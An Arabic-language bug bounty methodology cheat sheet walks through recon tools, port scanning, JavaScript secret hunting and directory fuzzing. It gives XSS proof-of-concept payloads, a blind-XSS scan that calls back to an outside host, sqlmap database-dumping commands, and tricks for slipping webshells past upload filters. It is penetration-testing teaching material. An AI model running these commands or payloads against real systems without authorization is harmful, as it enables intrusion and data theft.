🌍 1. Subdomain Enumeration Workflow

منهجية استكشاف النطاقات الفرعية الشاملة لتوسيع مساحة الهجوم

📋 Target workflow overview

أساس عمليات صيد الثغرات. الهدف هنا هو جمع كافة النطاقات الممكنة باستخدام نهج متعدد المراحل:

Recon
└── Subdomain Enumeration
    ├── Subfinder (OSINT APIs)
    ├── Assetfinder (Crt.sh)
    ├── Amass (DNS Mapping)
    ├── Findomain (Fast parsing)
    ├── Chaos (ProjectDiscovery DB)
    └── Httpx (Alive Checker)

Step 1 — Passive Enumeration Tools

الأداة ليه نستخدمها؟ الأمر الأساسي
Subfinder سريع جدًا ويعتمد على محركات الـ APIs بالكامل. subfinder -d target.com -all -recursive -silent
Assetfinder بسيط، خفيف، ويعتمد على محركات شهادات الأمان (crt.sh). assetfinder --subs-only target.com
Findomain سريع وممتاز في الاستخراج الفوري للنطاقات. findomain -t target.com
Amass (Passive) أقوى محرك استخبارات مفتوح المصدر (OSINT) لرسم هيكل النطاقات. amass enum -passive -d target.com

Step 2 — Merge Results & Deduplication

دمج مخرجات جميع الأدوات وحذف المكرر لتقليص حجم الملف المستهدف:

cat subfinder.txt assetfinder.txt amass.txt findomain.txt | sort -u > allsubs.txt

Step 3 — Alive Domains Checking (HTTPX)

تحديد الخوادم النشطة المستجيبة بروتوكولياً وتجاهل النطاقات الميتة (Dead / Parked Domains):

httpx -l allsubs.txt -status-code -title -tech-detect -o alive.txt

Step 4 — Visual Screenshotting

التقاط صور لمحتوى المواقع للفرز السريع واكتشاف الواجهات المنسية:

الأداة الوظيفة والآلية الأمر
Gowitness يلتقط صوراً معتمداً على محرك Chrome headless. gowitness file -f alive.txt
Aquatone يبني تقريراً مرئياً جميلاً مجمعاً للصفحات. cat alive.txt | aquatone

Step 5 — Target Decision Matrix

توجيه عملية الفحص بذكاء بناءً على نوع الخادم المكتشف (الفرق بين الهواة والمحترفين):

ماذا اكتشفنا؟ الخطوة التالية مباشرة (Target Action)
Login Panels اختبار التوثيق وتخمين الحسابات (Auth Testing / Bruteforcing)
Jenkins Server البحث عن الثغرات المعروفة (RCE Research / CVEs)
Swagger / JSON API سحب المسارات واختبار الـ endpoints (API Testing)
S3 Bucket Leaks فحص الصلاحيات ورفع الملفات (Bucket Misconfigurations)
WordPress فحص الإضافات والقوالب المصابة باستخدام wpscan

📡 2. Active Port Scanning

فحص المنافذ والخدمات النشطة للبحث عن خوادم فرعية معزولة

🛡️ Tools Selection: Naabu vs Nmap

Naabu: أداة سريعة للغاية مكتوبة بلغة Go مخصصة لفحص آلاف المنافذ بالثانية عبر فحص SYN.

Nmap: أداة فحص عميقة لمعرفة نوع وإصدار الخدمات المفتوحة ونظام التشغيل البرمجي.

🛠️ Port Scan Commands

1. Naabu fast ports discovery:

naabu -host target.com -top-ports 1000 -silent

2. Nmap depth scan on found ports:

nmap -sC -sV -Pn -p 80,443,8080,22 target.com

📜 5. JavaScript Recon Workflow

أخطر مسارات الاستطلاع للبحث عن المسارات السرية والمفاتيح داخل ملفات الـ JS

📦 JS Hunting Steps

JavaScript Recon
├── Collect JS Files (Katana / GAU)
├── Extract Endpoints (LinkFinder)
└── Extract Secrets (SecretFinder / GitLeaks)

Step 1 — Collect JS Files

سحب ملفات الجافا سكربت النشطة والأرشيفية للهدف:

katana -u https://target.com -jc | grep -E "\.js$" > js_files.txt

Step 2 — Extract Endpoints (LinkFinder)

تحليل ملف الـ JS واستخراج مسارات الـ API والـ Endpoints المكتوبة بداخله:

python3 linkfinder.py -i https://target.com/assets/main.js -o cli

Step 3 — Secrets Classification Matrix

الأسرار والمفاتيح الحساسة التي نكشفها بملفات الجافا سكربت:

نوع التسريب (Secret Type) أمثلة وتأثيرات
API Keys خرائط Google, Stripe API, Twilio SID (دفع فواتير أو إساءة استخدام)
AWS Creds AWS Access Key, Secret Access Key (تسريب البنية التحتية السحابية)
Internal Domains staging.target.local, dev.target.internal
Firebase Config تسريب مفتاح قاعدة بيانات Firebase المفتوحة للعامة لقراءتها

📂 7. Directory Discovery Workflow

منهجية التخمين الفائقة للمجلدات والملفات والمسارات المخفية

📦 Directory discovery tools

الأداة أفضل استخدام لـ الميزة الرئيسية
FFUF السرعة الفائقة وتخصيص الطلبات بسيط وسرعة معالجة عالية جداً
Feroxbuster الفحص المتداخل (Recursion) يقوم بفحص المجلدات التي يتم اكتشافها تلقائياً
Wfuzz التحكم الكامل بالبارامترات والمدخلات يدعم فلاتر متقدمة برمجياً

🛠️ Execution Workflow

1. Basic scanning with FFUF:

ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404

2. Recursive scanning with Feroxbuster:

feroxbuster -u https://target.com -w wordlist.txt -x php,html,txt,json

📂 Sensitive Files Discovery Matrix

أهم الملفات الحساسة التي نكشفها بملفات صيد المجلدات والخطورة الكامنة فيها:

الملف المكتشف مستوى الخطورة أهمية وتأثير الاكتشاف
.git/ Critical سحب الشيفرة البرمجية الكاملة للموقع وتاريخ التعديل
.env Critical مفاتيح الربط وكلمات مرور قاعدة البيانات والأسرار البرمجية
backup.zip / db.sql Critical تحميل قاعدة البيانات بالكامل أو نسخ احتياطية للموقع
swagger.json / api-docs High خرائط APIs وتفاصيل هيكل المدخلات لاختبارها مباشرة
phpinfo.php Medium تسريب معلومات تكوين خادم الويب والمسارات ومحركات الحماية

🌐 8. Cross Site Scripting (XSS) Workflow

منهجية الفحص والتعرف على سياقات الحقن وكتابة الحمولات المناسبة

📋 Context Analysis (مصفوفة سياقات الحقن)

الحقن الناجح يعتمد بالكامل على السياق البرمجي الذي يظهر فيه المدخل:

سياق الانعكاس (Context) أمثلة للحمولات (PoC Payload)
HTML Tags <script>alert(1)</script> أو <img src=x onerror=alert(1)>
HTML Attributes " onmouseover="alert(1) or " autofocus onerror="alert(1)
Javascript Block '; alert(1); // or -alert(1)-
URL Schemes javascript:alert(1) (في سياق روابط a href)

🛠️ Auto Scanning with Dalfox

dalfox url https://target.com/search?q=test -b https://your-blind-xss.xss.ht

💉 9. SQL Injection (SQLi) Workflow

منهجية كشف واستغلال ثغرات قواعد البيانات

📋 SQLi Detection Roadmap

SQLi Scan
├── Error-Based Detection (Injecting ' or ")
├── Boolean-Based Testing (Injecting AND 1=1 / AND 1=2)
├── Time-Based Blind Fuzzing (Injecting sleep(5))
└── Database Dumping (SQLMap / Ghauri)

🛠️ SQLMap Automated Command

sqlmap -u "https://target.com/item.php?id=1" --dbs --batch --random-agent

🔑 11. IDOR Testing

تخطي الصلاحيات والوصول لملفات فواتير وبيانات مستخدمين آخرين

💡 Testing Strategy

"قم بالتسجيل بحسابين مختلفين (A & B). استخرج طلب حساب A من Burp Suite، وقم بتعديل الـ ID أو اسم المستخدم إلى حساب B. إذا تم تنفيذ الطلب، فهناك ثغرة IDOR مؤكدة."

📤 12. File Upload Exploits

رفع ملفات خبيثة (Webshells) لتنفيذ الأوامر على خادم الهدف

🛠️ Bypassing Extensions Filters

طرق تخطي حظر رفع ملفات الـ PHP:

  • ✔ Alternative Extensions: رفع بصيغ بديلة مثل .phtml or .php5 or .phar.
  • ✔ Double Extensions: رفع باسم مثل image.png.php.
  • ✔ MIME-Type bypass: تعديل الـ Content-Type في الطلب إلى image/jpeg بدلاً من application/x-php.

⚡ 13. Race Conditions

⚙️ Multi-request attack scenario

إرسال طلبات متعددة لعمليات خصم الرصيد أو طلب الأكواد في أجزاء من الميكروثانية باستخدام Burp Suite Turbo Intruder لتكرار الكوبونات أو سحب رصيد مجاني.
